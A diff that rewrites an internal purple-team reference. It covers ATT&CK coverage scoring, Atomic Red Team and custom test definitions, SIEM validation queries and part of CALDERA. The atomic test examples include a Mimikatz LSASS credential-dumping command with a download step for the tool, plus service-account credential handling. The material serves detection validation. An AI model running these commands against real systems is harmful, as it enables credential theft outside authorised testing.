@@ -1,1447 +1,1542 @@
-# Purple Team Reference
+# PURPLE TEAM REFERENCE LIBRARY
 
-> **Adversary emulation, detection validation, Atomic Red Team, CALDERA, Sigma rules,
-> BAS tools, ATT&CK Navigator coverage, and continuous purple team programs.**
+**Version:** 1.0 | **Classification:** Internal Use | **Maintained by:** Security Engineering
 
 ---
 
 ## Table of Contents
 
 1. [Purple Team Fundamentals](#1-purple-team-fundamentals)
-2. [MITRE ATT&CK Navigator Usage](#2-mitre-attck-navigator-usage)
+2. [MITRE ATT&CK for Purple Teams](#2-mitre-attck-for-purple-teams)
 3. [Atomic Red Team](#3-atomic-red-team)
-4. [CALDERA — Adversary Emulation Platform](#4-caldera--adversary-emulation-platform)
-5. [Detection Validation Framework](#5-detection-validation-framework)
-6. [Sigma Rules for Detection Validation](#6-sigma-rules-for-detection-validation)
-7. [Breach and Attack Simulation (BAS) Tools](#7-breach-and-attack-simulation-bas-tools)
-8. [Purple Team Exercise Planning](#8-purple-team-exercise-planning)
-9. [Detection Engineering Workflow](#9-detection-engineering-workflow)
-10. [VECTR — Purple Team Tracking](#10-vectr--purple-team-tracking)
-11. [Adversary Emulation Plans](#11-adversary-emulation-plans)
-12. [Key Resources](#12-key-resources)
+4. [Adversary Emulation Platforms](#4-adversary-emulation-platforms)
+5. [Detection Validation Methodology](#5-detection-validation-methodology)
+6. [Threat Intelligence-Driven Purple Teaming](#6-threat-intelligence-driven-purple-teaming)
+7. [Purple Team Tools & Automation](#7-purple-team-tools--automation)
+8. [Active Directory Purple Teaming](#8-active-directory-purple-teaming)
+9. [Cloud Purple Teaming](#9-cloud-purple-teaming)
+10. [Purple Team Reporting & Maturity](#10-purple-team-reporting--maturity)
 
 ---
 
 ## 1. Purple Team Fundamentals
 
-### What Is a Purple Team?
+### 1.1 Purple Team Defined
 
-A purple team combines **red team offensive techniques** with **blue team detection
-validation** into a single collaborative effort. The red side executes techniques;
-the blue side verifies whether detection, alerting, and response capabilities work as
-expected. The result is direct, evidence-based feedback on the effectiveness of the
-security program.
+A purple team is a collaborative security function in which offensive (red) and defensive (blue) personnel work together in real time to improve detection and response capabilities. Unlike a traditional red team engagement — which is adversarial and designed to keep the blue team uninformed — a purple team shares attack context immediately so defenders can tune controls, build detections, and close gaps as testing progresses.
+
+**Core distinction:**
 
 | Dimension | Red Team | Purple Team |
-|-----------|----------|-------------|
-| Goal | Test without revealing | Improve detection together |
-| Output | Executive report (delayed) | Immediate detection coverage gaps |
-| Frequency | Annual or semi-annual | Continuous |
-| Feedback loop | Slow (weeks/months) | Fast (minutes) |
-| Blue team awareness | Blind | Informed and participating |
+|---|---|---|
+| Transparency | Blue unaware | Full collaboration |
+| Primary output | Breach narrative | Detection coverage improvement |
+| Feedback loop | End-of-engagement report | Continuous, per-technique |
+| Duration | Weeks–months | Hours–days per campaign |
+| Primary audience | Executive / Board | Detection engineering / SOC |
 
-### Why Purple Teams Matter
+### 1.2 Value Proposition
 
-- The gap between what attackers do and what defenders detect is the primary risk driver.
-- A SIEM with 10,000 rules is worthless if none of them fire on real attacker techniques.
-- Purple teaming is the only way to empirically measure detection coverage.
-- It converts threat intelligence into actionable detection improvements.
+**Faster detection improvement cycle:** Because both teams share context in real time, a missed detection can be diagnosed and tuned on the same day it is tested — not weeks later when a red team report is delivered.
 
-### Purple Team Maturity Model
+**Targeted gap analysis:** Purple teams can methodically test every technique in a threat actor's known playbook, producing a precise map of which TTPs are detected versus missed, rather than a sample of what a red teamer happened to use.
 
-| Level | Name | Description |
-|-------|------|-------------|
-| 1 | **Ad hoc** | Occasional knowledge sharing between red and blue; no structure |
-| 2 | **Structured** | Planned exercises with defined scope, schedule, and documentation |
-| 3 | **Continuous** | Ongoing validation pipeline — detection-as-code + automated testing |
-| 4 | **Optimized** | Threat-intel driven; automated detection validation in CI/CD; coverage heatmap maintained in real time |
+**Cost-effective vs. full red team:** Skilled red teamers are expensive. Purple teaming multiplies the return on that investment by ensuring every technique tested produces a detection improvement, not just a finding.
 
-### Core Output of a Purple Team Exercise
+**Continuous security improvement culture:** Regular purple team exercises build a shared language between offense and defense, reduce organizational friction between teams, and embed security validation into normal operations.
 
-- Detection coverage heatmap (ATT&CK Navigator layer)
-- List of undetected techniques with root cause analysis
-- Tuned alert thresholds and reduced false positives
-- Closed visibility gaps (missing log sources, rule gaps, sensor blind spots)
-- Updated detection rules with confirmed true-positive evidence
-- Re-test schedule with owners assigned to each gap
+### 1.3 Purple Team Models
 
-### Continuous Purple Team Loop
+**Ad-hoc collaborative:** A red team operator and a detection engineer sit together and run individual atomic tests, checking the SIEM after each execution. Low overhead, good for initial gap assessment or new log source validation.
 
-```
-Threat Intel
-     │
-     ▼
-ATT&CK Mapping
-     │
-     ▼
-Emulate Technique ──► Check SIEM ──► Detected? ──YES──► Document (green)
-     │                                   │
-     │                                   NO
-     │                                   │
-     │                              Root Cause Analysis
-     │                                   │
-     │                              Create/Tune Rule
-     │                                   │
-     │                              Re-Test
-     │                                   │
-     └────────────────────────────────── ▲
-```
+**Structured campaigns:** Planned exercises with defined scope, threat actor emulation plan, and documented results in a tracking platform (e.g., Vectr). Run quarterly or monthly. Produces before/after ATT&CK coverage heatmaps.
 
----
+**Continuous automated:** Atomic tests run on a scheduled basis (daily or weekly) via CI/CD pipeline. SIEM is queried automatically after each test. Coverage dashboard is updated programmatically. Regression alerts fire if a previously detected technique stops alerting.
 
-## 2. MITRE ATT&CK Navigator Usage
+### 1.4 MITRE ATT&CK as Common Language
 
-### ATT&CK Navigator Overview
+ATT&CK provides the shared vocabulary that makes purple teaming tractable at scale.
 
-**URL:** https://mitre-attack.github.io/attack-navigator/
+**Technique IDs as atomic unit:** Each test maps to a specific technique (T1059.001 — PowerShell) or sub-technique. This enables unambiguous tracking: "We tested T1003.001 and it is detected" is a precise statement that any team member can act on.
 
-The ATT&CK Navigator is a web-based tool for annotating and exploring the ATT&CK matrix.
-It is the primary visualization layer for purple team coverage tracking.
+**Tactic coverage measurement:** ATT&CK's 14 tactics (see Section 2) form the rows of a coverage heatmap. Teams can track what percentage of techniques under each tactic are detected, and prioritize the most-used tactics by active threat actors.
 
-### Creating a Coverage Layer
+**ATT&CK Navigator heatmap:** The ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/) allows teams to color-code techniques by detection status. Red = undetected, green = detected, yellow = partial/low-quality. Before-and-after layers quantify the coverage improvement from a purple team exercise.
 
-1. Open the Navigator
-2. Create a new layer → select domain (Enterprise / ICS / Mobile)
-3. Add a layer for **"What threat actor does"** (color: red)
-4. Add a layer for **"What we detect"** (color: green)
-5. Use layer comparison to find gaps
+**Common scoring scale:** Techniques are scored 0–100 in Navigator layers: 0 = no detection, 50 = telemetry only (raw log but no alert), 75 = alert fires but quality is poor, 100 = alert fires with correct context, severity, and analyst-ready enrichment.
 
-**Color convention:**
+### 1.5 Program Design
 
-| Color | Meaning |
-|-------|---------|
-| Red | No detection whatsoever |
-| Orange | Partially logged (events appear in SIEM but no rule exists) |
-| Yellow | Rule exists but fires inconsistently or at wrong severity |
-| Green | Alert fires with appropriate severity and response playbook exists |
+**Scope definition:** Which asset classes are in scope (endpoints, AD, cloud, OT)? Which threat actors are being emulated? What is the crown jewel data being protected?
 
-### Threat-Intel Driven Prioritization Workflow
+**Cadence:** Recommended minimum: monthly automated atomic validation + quarterly structured campaign + annual full red team. Adjust to team capacity and organizational risk appetite.
 
-1. Identify threat actors targeting your sector
-   - CISA advisories and Joint Cybersecurity Advisories
-   - ISAC threat intelligence feeds (FS-ISAC, H-ISAC, etc.)
-   - Mandiant M-Trends, CrowdStrike Global Threat Report, Secureworks CTIR
-2. Pull ATT&CK Group pages for relevant actors
-   - APT29 (Cozy Bear) — T1566, T1195, T1059.001, T1003.001, T1550.002, T1048
-   - Lazarus Group — T1189, T1059.001, T1055, T1083, T1005, T1041
-   - FIN7 — T1566.001, T1059.001, T1547.001, T1003, T1021.002
-   - ALPHV/BlackCat — T1486, T1490, T1489, T1562.001, T1070.004
-3. Map TTPs to ATT&CK Navigator layer
-4. Identify gaps where detections do not exist
-5. Run purple team exercises against those specific techniques
-6. Close gaps and re-run
+**Stakeholders:** Purple team lead (coordinator), red team operator (executor), detection engineer (builder), SOC analyst (validator), threat intel analyst (scenario designer), CISO (executive sponsor).
 
-### ATT&CK STIX Data (Programmatic Use)
+**Rules of engagement:** Purple team RoE should document: test systems (not production unless agreed), notification chain, abort criteria, data handling for findings, and tool usage policy.
 
-```python
-# Download ATT&CK STIX data
-# https://github.com/mitre/cti
+**Success metrics:** Coverage % before/after, number of new detections created, number of detections tuned, mean time to detect (MTTD) improvement, remediation rate from prior exercises.
 
-import requests, json
+### 1.6 Prerequisite Maturity
 
-url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
-stix = requests.get(url).json()
+Before launching a purple team program, the following baseline capabilities should be in place:
 
-# Extract all techniques
-techniques = [
-    obj for obj in stix["objects"]
-    if obj["type"] == "attack-pattern"
-    and not obj.get("x_mitre_deprecated", False)
-]
+- **EDR deployed** at >90% endpoint coverage with telemetry flowing to SIEM
+- **SIEM operational** with retention adequate for purple team test windows (minimum 30 days)
+- **Basic IR process** — the team knows how to investigate an alert and escalate
+- **Logging baseline** — Windows Event Log forwarding (Security, System, Sysmon), network flow logs, DNS query logs, authentication logs
+- **MITRE ATT&CK familiarity** — at least one team member can map activity to ATT&CK techniques
 
-print(f"Total techniques: {len(techniques)}")
-
-# Get technique by ID
-def get_technique(techniques, tid):
-    for t in techniques:
-        for ref in t.get("external_references", []):
-            if ref.get("external_id") == tid:
-                return t
-    return None
-
-t = get_technique(techniques, "T1059.001")
-print(t["name"])           # Command and Scripting Interpreter: PowerShell
-print(t["description"])
-```
-
-### ATT&CK Navigator Layer JSON (Programmatic Creation)
-
-```python
-import json
-
-layer = {
-    "name": "Purple Team Exercise - 2024-Q1",
-    "versions": {"attack": "14", "navigator": "4.9.5", "layer": "4.5"},
-    "domain": "enterprise-attack",
-    "description": "Coverage after Q1 2024 purple team exercise",
-    "filters": {"platforms": ["Windows", "Linux", "macOS"]},
-    "gradient": {
-        "colors": ["#ff6666", "#ffe766", "#8ec843"],
-        "minValue": 0,
-        "maxValue": 100
-    },
-    "techniques": [
-        {"techniqueID": "T1059.001", "score": 100, "comment": "Detected via PowerShell block logging + Sigma rule"},
-        {"techniqueID": "T1003.001", "score": 50,  "comment": "Logged only — LSASS access events present but no alert"},
-        {"techniqueID": "T1021.002", "score": 0,   "comment": "BLIND — no detection for lateral SMB/PsExec"},
-    ]
-}
-
-with open("coverage_layer.json", "w") as f:
-    json.dump(layer, f, indent=2)
-```
+Without these foundations, purple team results will be dominated by infrastructure gaps rather than detection logic gaps, and the value of the exercise is significantly reduced.
 
 ---
+## 2. MITRE ATT&CK for Purple Teams
 
+### 2.1 Matrix Structure
+
+The ATT&CK Enterprise matrix contains **14 tactics** representing phases or objectives of an adversary operation:
+
+| # | Tactic | ID | Focus |
+|---|---|---|---|
+| 1 | Reconnaissance | TA0043 | Gather info before attack |
+| 2 | Resource Development | TA0042 | Acquire infrastructure/tools |
+| 3 | Initial Access | TA0001 | Enter the environment |
+| 4 | Execution | TA0002 | Run malicious code |
+| 5 | Persistence | TA0003 | Maintain foothold |
+| 6 | Privilege Escalation | TA0004 | Gain higher permissions |
+| 7 | Defense Evasion | TA0005 | Avoid detection |
+| 8 | Credential Access | TA0006 | Steal credentials |
+| 9 | Discovery | TA0007 | Learn environment |
+| 10 | Lateral Movement | TA0008 | Move through network |
+| 11 | Collection | TA0009 | Gather target data |
+| 12 | Command and Control | TA0011 | Communicate with implants |
+| 13 | Exfiltration | TA0010 | Remove data |
+| 14 | Impact | TA0040 | Disrupt / destroy |
+
+**Sub-techniques (T1xxx.xxx):** Many techniques have sub-techniques that specify the exact method. For example, T1059 (Command and Scripting Interpreter) has sub-techniques T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1059.006 (Python), etc. Purple teams should test at the sub-technique level for maximum precision.
+
+**Procedure examples:** ATT&CK procedure examples in the knowledge base document how specific threat actors (e.g., APT29, Lazarus Group) have implemented a technique. These procedures are the raw material for realistic emulation scenarios.
+
+### 2.2 ATT&CK Navigator
+
+The ATT&CK Navigator is the primary visualization tool for purple team coverage tracking.
+
+**Layer creation:**
+1. Navigate to https://mitre-attack.github.io/attack-navigator/
+2. Click "Create New Layer" → Select "Enterprise ATT&CK"
+3. Use the technique controls panel to score/color each technique
+4. Save layers as JSON for version control
+
+**Technique scoring 0–100:**
+- **0** — No detection capability, no telemetry
+- **25** — Raw telemetry exists (log source) but no detection rule
+- **50** — Detection rule exists but did not fire during test
+- **75** — Alert fired but quality is insufficient (missing context, wrong severity)
+- **100** — Alert fired with correct ATT&CK tagging, analyst-ready enrichment, and linked playbook
+
+**Color coding:**
+- Red (#ff6666) — Not detected
+- Yellow (#ffff00) — Partial / telemetry only
+- Green (#00cc44) — Detected with good quality
+
+**Aggregate layers:** Navigator supports creating aggregate layers from multiple individual layers, useful for combining results across platforms (Windows + Linux + Cloud) or across different purple team campaigns.
+
+**Export formats:**
+- JSON — For version control and programmatic processing
+- Excel (XLSX) — For stakeholder reporting with filtering
+- SVG — For embedding in presentations and reports
+
+**Before-after comparison:** Export a "before" layer at the start of a purple team exercise and an "after" layer at the end. Load both into Navigator to visually demonstrate coverage improvement.
+
+### 2.3 Threat-Informed Defense
+
+**CTID (Center for Threat-Informed Defense):** A non-profit R&D organization (operated with MITRE) that produces open-source research to advance threat-informed defense. Key outputs: adversary emulation plans, ATT&CK Workbench, mappings to security controls.
+
+**Red Canary Top Techniques (by prevalence):** Red Canary publishes annual Threat Detection Reports ranking the most-prevalent ATT&CK techniques seen across their customer base. Prioritize purple team coverage of these high-frequency techniques:
+- T1059 Command and Scripting Interpreter (consistently #1)
+- T1218 System Binary Proxy Execution
+- T1055 Process Injection
+- T1547.001 Registry Run Keys / Startup Folder
+- T1105 Ingress Tool Transfer
+
+**Prioritizing most-used techniques by active actors:** Cross-reference ATT&CK Groups (https://attack.mitre.org/groups/) to find techniques used by threat actors targeting your industry. Weight purple team test prioritization by: (frequency of actor use) × (business impact if successful) × (current coverage gap).
+
+### 2.4 ATT&CK Evaluations
+
+MITRE conducts annual evaluations of security products against emulated threat actors. Results are published at https://attackevals.mitre-engenuity.org/.
+
+**Evaluation rounds:**
+- APT3 (2018) — Chinese espionage group
+- APT29 (2019) — Russian SVR / Cozy Bear
+- Carbanak+FIN7 (2020) — Financially motivated threat actors
+- Wizard Spider+Sandworm (2021) — Ransomware + Russian GRU
+- Turla (2022) — Russian FSB espionage
+
+**Detection analytics vs. visibility scoring:**
+- **Visibility** — The product captured telemetry about the action (raw data exists)
+- **Detection** — The product generated an analytic alert about the action
+
+**Vendor results interpretation for purple teams:** ATT&CK Evaluations reveal which techniques your EDR vendor detects with analytics vs. merely captures as telemetry. Use this to identify where you need to build custom SIEM rules to compensate for EDR analytic gaps.
+
+### 2.5 D3FEND Framework
+
+MITRE D3FEND (https://d3fend.mitre.org/) is a complementary ontology of defensive countermeasures mapped to ATT&CK offensive techniques.
+
+**Countermeasures ontology:** D3FEND organizes defensive techniques into categories: Harden, Detect, Isolate, Deceive, Evict.
+
+**Technique-to-countermeasure mapping:** For any ATT&CK offensive technique, D3FEND identifies the defensive countermeasures that address it. Purple teams can use this to:
+1. Identify which defensive controls should have prevented/detected a tested technique
+2. Prioritize defensive improvements based on what countermeasures are missing
+3. Communicate defensive recommendations using a standardized ontology
+
+---
 ## 3. Atomic Red Team
 
-### Overview
+### 3.1 Framework Overview
 
-Atomic Red Team is a framework by **Red Canary** consisting of small, focused tests
-(called "atoms") that each emulate a single ATT&CK technique. The library contains
-hundreds of tests for Windows, Linux, and macOS.
+Atomic Red Team (https://github.com/redcanaryco/atomic-red-team) is an open-source library of small, focused tests that each map 1:1 to a MITRE ATT&CK technique or sub-technique. Developed and maintained by Red Canary.
 
-- **Repository:** https://github.com/redcanaryco/atomic-red-team
-- **Test library:** https://atomicredteam.io/atomics/
+**Design principles:**
+- **Atomic** — Each test does one thing. No complex multi-step attack chains. This enables precise detection validation.
+- **Minimal prerequisites** — Tests should run with minimal setup. Prerequisites are documented and auto-installable where possible.
+- **Cleanup commands** — Every test includes commands to undo its changes, ensuring test systems remain clean for repeated testing.
+- **Multiple executor types** — Tests run via command_prompt, powershell, bash, manual, or python executors, matching real-world attacker tool usage.
 
-### Invoke-AtomicRedTeam (PowerShell Framework)
+**YAML format:** Each atomic test is defined in a YAML file organized by ATT&CK technique ID (e.g., `atomics/T1059.001/T1059.001.yaml`).
 
+### 3.2 Invoke-AtomicRedTeam
+
+The primary PowerShell framework for executing atomic tests on Windows.
+
+**Installation:**
 ```powershell
-# ── Installation ──────────────────────────────────────────────────────────────
-Install-Module -Name invoke-atomicredteam, powershell-yaml -Scope CurrentUser -Force
+# Install the module from PowerShell Gallery
+Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force
 Import-Module invoke-atomicredteam
 
-# Set the path to your cloned Atomic Red Team repo
-$PSDefaultParameterValues = @{"Invoke-AtomicTest:PathToAtomicsFolder" = "C:\AtomicRedTeam\atomics"}
+# Install atomics folder (the test library)
+Invoke-AtomicTest T1059.001 -GetPrereqs
+# Or clone directly:
+# git clone https://github.com/redcanaryco/atomic-red-team.git C:\AtomicRedTeam
+```
 
-# ── Exploration ───────────────────────────────────────────────────────────────
+**Core commands:**
+```powershell
 # List all tests for a technique (brief)
 Invoke-AtomicTest T1059.001 -ShowDetailsBrief
 
-# List all tests with full details
-Invoke-AtomicTest T1059.001 -ShowDetails
+# Install prerequisites for a test
+Invoke-AtomicTest T1059.001 -GetPrereqs
 
-# ── Execution ─────────────────────────────────────────────────────────────────
-# Run all tests for technique
-Invoke-AtomicTest T1059.001
-
-# Run specific test number
+# Execute test #1
 Invoke-AtomicTest T1059.001 -TestNumbers 1
 
-# Run with custom input arguments
-Invoke-AtomicTest T1003.001 -InputArgs @{"output_file" = "C:\temp\lsass.dmp"}
+# Execute all tests for a technique
+Invoke-AtomicTest T1059.001
 
-# Check prerequisites before running
-Invoke-AtomicTest T1218.011 -CheckPrereqs     # Signed binary proxy execution (Rundll32)
+# Execute with custom input arguments
+Invoke-AtomicTest T1059.001 -TestNumbers 1 -InputArgs @{command="whoami"}
 
-# Get prerequisites (auto-install dependencies)
-Invoke-AtomicTest T1218.011 -GetPrereqs
-
-# ── Cleanup ───────────────────────────────────────────────────────────────────
-# Clean up artifacts after test
-Invoke-AtomicTest T1059.001 -Cleanup
-
-# Clean up specific test
+# Run cleanup after test
 Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
 
-# ── Logging ───────────────────────────────────────────────────────────────────
-# Log results to CSV
-Invoke-AtomicTest T1059.001 -LoggingModule "Attire-ExecutionLogger" `
-    -ExecutionLogPath "C:\Logs\atomic_results.csv"
+# Execute ALL atomics (full coverage run — use on dedicated test system)
+Invoke-AtomicTest All
+
+# Execute all with prerequisites auto-installed
+Invoke-AtomicTest All -GetPrereqs; Invoke-AtomicTest All
 ```
 
-### High-Value Atomic Tests for Purple Teams
+**Logging output:** Pipe to a log file for SIEM ingestion validation:
+```powershell
+Invoke-AtomicTest T1059.001 -LoggingModule "Attire-ExecutionLogger" -ExecutionLogPath "C:\Temp\atomics_log.json"
+```
 
-| ATT&CK ID | Name | Platform | Detection Focus |
-|-----------|------|----------|-----------------|
-| T1059.001 | PowerShell | Windows | PowerShell block logging, script block logging |
-| T1059.003 | cmd.exe | Windows | Command-line auditing, process creation |
-| T1003.001 | LSASS Memory | Windows | Process access to lsass.exe, WDigest |
-| T1003.002 | SAM dump | Windows | Registry access to HKLM\SAM |
-| T1053.005 | Scheduled Tasks | Windows | Schtasks.exe, EventID 4698 |
-| T1547.001 | Run Keys | Windows | Registry HKCU\...\Run modifications |
-| T1548.002 | UAC Bypass | Windows | Auto-elevated process without UAC prompt |
-| T1558.003 | Kerberoasting | Windows | 4769 (TGS request, RC4 encryption) |
-| T1021.002 | SMB/PsExec | Windows | 4624 logon type 3, service creation |
-| T1021.006 | WinRM | Windows | 4624 logon type 3, wsmprovhost.exe |
-| T1550.002 | Pass-the-Hash | Windows | 4624 NTLMv2, unusual source IP |
-| T1070.001 | Clear Windows EventLog | Windows | EventID 1102, wevtutil.exe |
-| T1140 | Deobfuscate/Decode | Windows | certutil.exe -decode, msiexec |
-| T1041 | Exfil over C2 | Windows/Linux | Unusual outbound HTTP/DNS volumes |
-| T1083 | File/Dir Discovery | Windows/Linux | Mass file enumeration in short window |
-
-### Atomic Test YAML Structure
+### 3.3 Atomic Test YAML Structure
 
 ```yaml
 attack_technique: T1059.001
 display_name: "Command and Scripting Interpreter: PowerShell"
 atomic_tests:
-  - name: Mimikatz — Credentials Dump All Logon Passwords
+  - name: "Mimikatz - Credential Dumping"
+    auto_generated_guid: "f3132740-55bc-48c4-bcc0-758a459cd027"
     description: |
-      Dumps credentials from LSASS memory using Mimikatz sekurlsa module.
-      Requires elevation.
+      Dumps credentials from LSASS using Mimikatz sekurlsa::logonpasswords
     supported_platforms:
       - windows
     input_arguments:
       mimikatz_path:
         description: Path to mimikatz executable
         type: path
-        default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
-      output_file:
-        description: Path to save output
-        type: path
-        default: C:\Windows\Temp\mimikatz_output.txt
+        default: "PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe"
+    dependency_executor_name: powershell
+    dependencies:
+      - description: "Mimikatz must exist on disk at specified location"
+        prereq_command: |
+          if (Test-Path "#{mimikatz_path}") { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          Invoke-WebRequest -Uri "https://github.com/..." -OutFile "#{mimikatz_path}"
     executor:
       name: command_prompt
       elevation_required: true
       command: |
-        #{mimikatz_path} "privilege::debug" "sekurlsa::logonpasswords" exit > #{output_file}
-    cleanup_command: |
-      del /f /q #{output_file} 2>nul
+        #{mimikatz_path} "sekurlsa::logonpasswords" "exit"
+      cleanup_command: |
+        Remove-Item "#{mimikatz_path}" -ErrorAction Ignore
 ```
 
-### Custom Atomic Tests
+**Key YAML fields:**
+- `auto_generated_guid` — Unique identifier for each test, used in logging
+- `supported_platforms` — windows / linux / macos
+- `executor.name` — command_prompt / powershell / bash / manual / python
+- `elevation_required` — Whether admin/root is required
+- `input_arguments` — Parameterized inputs with defaults (use `#{arg_name}` syntax)
+- `dependencies` — Prerequisites check/install pattern
+- `cleanup_command` — Undo the test's changes
 
-Organizations can write their own atomic tests for internal tools or processes:
+### 3.4 Creating Custom Atomic Tests
+
+For organization-specific detections (e.g., testing a proprietary application's audit logging):
 
 ```yaml
 attack_technique: T1078.002
-display_name: "Valid Accounts: Domain Accounts"
+display_name: "Valid Accounts: Domain Accounts - Custom"
 atomic_tests:
-  - name: Login with service account credentials
+  - name: "Authenticate to internal ACME app with service account"
+    auto_generated_guid: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
     description: |
-      Simulates an attacker using a stolen service account credential.
-      Custom test specific to our environment.
+      Tests whether authentication with the corp-svc-deploy account to
+      the ACME internal portal triggers a SIEM alert for service account
+      interactive login anomaly.
     supported_platforms:
       - windows
-    input_arguments:
-      username:
-        description: Service account username
-        type: string
-        default: svc-backup
-      domain:
-        description: Domain name
-        type: string
-        default: corp.local
     executor:
       name: powershell
       elevation_required: false
       command: |
-        $cred = Get-Credential -UserName "#{domain}\#{username}" -Message "Enter password"
+        # Simulate interactive login with service account credentials
+        $cred = New-Object System.Management.Automation.PSCredential(
+          "CORP\corp-svc-deploy",
+          (ConvertTo-SecureString "#{password}" -AsPlainText -Force)
+        )
         Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
+      cleanup_command: |
+        Write-Host "No cleanup required"
 ```
 
-### CI/CD Integration for Automated Detection Validation
+### 3.5 Integration with SIEM/EDR for Validation
 
-```yaml
-# GitHub Actions example — runs atomics against staging, checks SIEM for detection
-name: Detection Validation
+**Validation workflow:**
+1. Execute atomic test on dedicated test endpoint
+2. Wait defined SLA (e.g., 5 minutes for SIEM ingestion)
+3. Query SIEM for expected alert/telemetry
+4. Document result: Detected / Not Detected / False Negative
+5. Run cleanup
 
-on:
-  schedule:
-    - cron: "0 2 * * 1"   # every Monday at 2 AM
-  workflow_dispatch:
+**SIEM query after PowerShell execution (Splunk example):**
+```spl
+index=windows EventCode=4104 ScriptBlockText="*mimikatz*"
+| table _time, ComputerName, UserID, ScriptBlockText
+```
 
-jobs:
-  validate-detections:
-    runs-on: [self-hosted, windows-staging]
-    steps:
-      - name: Install Invoke-AtomicRedTeam
-        shell: pwsh
-        run: |
-          Install-Module invoke-atomicredteam, powershell-yaml -Force -Scope CurrentUser
-
-      - name: Run T1059.001 Atomic Test
-        shell: pwsh
-        run: |
-          Import-Module invoke-atomicredteam
-          Invoke-AtomicTest T1059.001 -TestNumbers 1
-          Start-Sleep -Seconds 30    # wait for log ingestion
-
-      - name: Check SIEM for Detection
-        shell: python
-        run: |
-          import requests, sys, json, datetime
-          # Query Splunk for the expected alert
-          resp = requests.get(
-              "https://splunk.corp.local:8089/services/search/jobs/export",
-              params={
-                  "search": 'search index=windows source=WinEventLog:Security EventCode=4103 | stats count',
-                  "earliest_time": "-5m",
-                  "output_mode": "json"
-              },
-              auth=("admin", "${{ secrets.SPLUNK_PASSWORD }}"),
-              verify=False
-          )
-          count = sum(int(r.get("count",0)) for r in resp.json().get("results",[]))
-          if count == 0:
-              print("FAIL: T1059.001 PowerShell not detected in SIEM!")
-              sys.exit(1)
-          print(f"PASS: {count} detection events found")
-
-      - name: Cleanup
-        shell: pwsh
-        if: always()
-        run: |
-          Import-Module invoke-atomicredteam
-          Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
+**Atomics folder organization:**
+```
+atomic-red-team/
+  atomics/
+    T1059.001/
+      T1059.001.yaml         # Test definitions
+      T1059.001.md           # Human-readable documentation
+      src/                   # Supporting scripts/binaries
+    T1003.001/
+      T1003.001.yaml
+    ...
+  bin/                       # Invoke-AtomicRedTeam module
+  docs/                      # Documentation
 ```
 
 ---
+## 4. Adversary Emulation Platforms
 
-## 4. CALDERA — Adversary Emulation Platform
+### 4.1 CALDERA
 
-### Overview
+CALDERA (https://github.com/mitre/caldera) is MITRE's open-source adversary emulation platform. It provides a server-agent architecture for automated adversary emulation campaigns.
 
-CALDERA is MITRE's open-source adversary emulation platform. It provides a
-server-based architecture for running automated and semi-automated ATT&CK-mapped
-operations through deployed agents.
+**Architecture:**
+- **Server** — Web UI + REST API, hosts campaigns, adversary profiles, and abilities
+- **Agents** — Deployed on target systems, receive instructions from server
+  - **Sandcat** — Default Go-based agent, HTTP/S C2
+  - **MANX** — Reverse-shell style agent for environments blocking outbound connections
+  - **Ragdoll** — Python-based agent for macOS/Linux
 
-- **Repository:** https://github.com/mitre/caldera
-- **Documentation:** https://caldera.readthedocs.io
+**Key concepts:**
+- **Ability** — A single action mapped to an ATT&CK technique (equivalent to an atomic test)
+- **Adversary** — A collection of abilities organized into a threat actor profile
+- **Operation** — An execution of an adversary profile against one or more agents
+- **Planner** — The algorithm that determines ability execution order:
+  - `sequential` — Executes abilities in defined order
+  - `batch` — Runs all available abilities concurrently
+  - `bucketlist` — Executes abilities grouped by tactic
+  - `atomic` — One ability at a time, waits for result before next
 
-### Architecture
+**Plugins:**
+- **Stockpile** — Library of pre-built abilities and adversary profiles
+- **Compass** — ATT&CK Navigator integration for coverage visualization
+- **Debrief** — Post-operation reporting and analysis
+- **Filestore** — File hosting for payloads
+- **Response** — Automated response actions (blue team automation)
 
-```
-┌─────────────────────────────────────────────────────┐
-│                 CALDERA Server                       │
-│  ┌──────────┐  ┌──────────┐  ┌───────────────────┐  │
-│  │  Planner │  │ Plugins  │  │  REST API / Web UI │  │
-│  └──────────┘  └──────────┘  └───────────────────┘  │
-└──────────────────────────┬──────────────────────────┘
-                           │ C2 over HTTP/S or DNS
-          ┌────────────────┼────────────────┐
-          ▼                ▼                ▼
-     Agent (Sandcat)  Agent (Manx)   Agent (Ragdoll)
-     Windows           Windows        macOS / Linux
-```
-
-### Installation and Startup
-
+**REST API — Starting an operation:**
 ```bash
-# Clone and install
-git clone https://github.com/mitre/caldera.git --recursive
-cd caldera
-pip3 install -r requirements.txt
-
-# Start server (development mode)
-python3 server.py --insecure
-
-# Start with SSL
-python3 server.py --ssl
-
-# Start with specific config
-python3 server.py --config conf/default.yml
+curl -X POST http://localhost:8888/api/v2/operations   -H "KEY: ADMIN123"   -H "Content-Type: application/json"   -d '{
+    "name": "Purple Team Test - APT29",
+    "adversary": {"adversary_id": "apt29-id"},
+    "planner": {"id": "sequential-planner-id"},
+    "group": "purple-team-endpoints",
+    "auto_close": true
+  }'
 ```
 
-**Default credentials:**
-| Role | Username | Password |
-|------|----------|----------|
-| Admin | admin | admin |
-| Red | red | admin |
-| Blue | blue | admin |
-
-**Web UI:** http://localhost:8888
-
-### Key Plugins
-
-| Plugin | Purpose |
-|--------|---------|
-| **Stockpile** | 400+ pre-built abilities mapped to ATT&CK techniques |
-| **Emu** | Adversary emulation profiles (APT29, FIN6, menuPass) |
-| **Atomic** | Integration with Atomic Red Team test library |
-| **Compass** | Generates ATT&CK Navigator layers from operation results |
-| **Human** | Simulates realistic user behavior (browse, type, click) |
-| **Debrief** | Operation reporting and gap analysis |
-| **Manx** | Reverse shell agent (TCP) |
-| **Ragdoll** | macOS agent |
-| **Response** | Automated defender responses to detections |
-
-### CALDERA REST API — Python Examples
-
-```python
-import requests, json
-
-BASE = "http://localhost:8888"
-HEADERS = {"KEY": "ADMIN123"}   # replace with your API key from conf/default.yml
-
